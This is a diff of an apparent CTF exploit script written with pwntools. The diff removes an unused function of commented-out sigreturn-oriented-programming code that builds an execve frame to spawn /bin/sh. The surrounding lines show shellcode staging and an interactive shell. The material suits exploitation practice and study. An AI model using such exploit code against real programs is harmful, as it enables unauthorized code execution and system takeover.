@@ -39,7 +39,6 @@ def sd(data):
 def rl():
 	return io.recvline()
 
-
 def way1():
 	# 1.read payload to rsp 0x400028 (shellcode must have less than 5 push)
 
@@ -126,27 +125,6 @@ def pwn():
 	way2()
 	
 	io.interactive()
-
-def pwn1():
-	print 12
-	# frame = SigreturnFrame(kernel='amd64')
-	# frame.rax = constants.linux.amd64.SYS_execve# 10
-	# frame.rdi = 0xcccccccccccccccc
-	# frame.rsi = 0
-	# frame.rdx = 0
-	# frame.rcx = 0x2f62696e2f736800
-	# frame.rsp = point_start_addr
-	# frame.rip = syscallret_addr
-
-	# payload3 = p64(start_addr)+ 'C'*8 +str(frame)
-	# sd(payload3) # rop set frame
-	# wait()
-	# log.info('finish arrange frame and rop')
-
-	# payload4 = p64(syscallret_addr).ljust(15,'B')
-	# sd(payload4)
-	# log.info('finish eax=15 and call sys_execve')
-	# wait()
 
 if __name__ == '__main__':
 	pwn()
